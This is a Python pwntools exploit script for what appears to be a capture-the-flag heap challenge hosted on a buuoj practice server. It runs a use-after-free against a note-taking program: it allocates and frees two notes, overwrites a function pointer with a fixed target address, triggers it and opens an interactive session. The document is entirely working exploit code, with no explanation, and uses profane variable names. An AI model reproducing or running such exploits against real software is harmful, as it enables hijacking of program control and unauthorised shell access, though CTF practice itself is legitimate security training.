from pwn import *
r = remote('node3.buuoj.cn',28026)
fuck = 0x8048945

def add(size,content):
	r.recvuntil('Your choice :')
	r.sendline('1')
	r.recvuntil('Note size :')
	r.sendline(str(size))
	r.recvuntil('Content :')
	r.sendline(content)

def free(index):
	r.recvuntil('Your choice :')
	r.sendline('2')
	r.recvuntil('Index :')
	r.sendline(str(index))

def show(index):
	r.recvuntil('Your choice :')
	r.sendline('3')
	r.recvuntil('Index :')
	r.sendline(str(index))

add(0x60,'fuck')
add(0x60,'fuck')
free(0)
free(1)
add(0x60,p32(fuck))
show(0)
r.interactive()